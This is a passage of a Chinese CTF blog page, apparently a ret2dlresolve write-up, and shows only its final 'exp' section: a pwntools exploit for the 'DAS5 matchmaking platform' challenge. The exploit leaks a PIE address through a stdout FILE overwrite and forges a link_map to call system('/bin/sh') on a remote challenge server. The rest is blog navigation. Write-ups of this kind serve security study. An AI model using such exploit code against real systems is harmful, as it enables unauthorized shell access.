+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26613</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Age &gt;&gt; &#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Photo(URL) &gt;&gt; &#x27;</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xb0\x5d&#x27;</span>)</span><br><span class="line">pie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-elf.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pie + <span class="number">0x4140</span> - <span class="number">0x67</span>) + <span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;\x08&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Name &gt;&gt; &#x27;</span>,payload)</span><br><span class="line">payload = p64(pie + <span class="number">0x8</span>).ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(pie + <span class="number">0x4140</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Hobby &gt;&gt; &#x27;</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#pause()</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ret2dlresolve/" rel="tag"># ret2dlresolve</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/17/CVE-2020-6507/" rel="prev" title="CVE-2020-6507">
+      <i class="fa fa-chevron-left"></i> CVE-2020-6507
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dlresolve"><span class="nav-number">1.</span> <span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-number">1.1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">延迟绑定流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E7%9A%84%E6%AE%B5"><span class="nav-number">1.1.2.</span> <span class="nav-text">一些重要的段</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dynamic"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">.dynamic</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dynstr"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">.dynstr</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dynsym"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">.dynsym</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#rel-plt"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">.rel.plt</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dl-runtime-resolve"><span class="nav-number">1.1.3.</span> <span class="nav-text">_dl_runtime_resolve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-number">1.2.</span> <span class="nav-text">64位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">延迟绑定流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dl-runtime-resolve-xsavec"><span class="nav-number">1.2.2.</span> <span class="nav-text">_dl_runtime_resolve_xsavec</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NO-RELRO"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">NO RELRO</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Partial-RELRO"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Partial RELRO</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DAS5-matchmaking-platform"><span class="nav-number">2.</span> <span class="nav-text">DAS5 matchmaking platform</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞和利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#link-map%E7%9A%84%E4%BC%AA%E9%80%A0"><span class="nav-number">2.2.</span> <span class="nav-text">link_map的伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
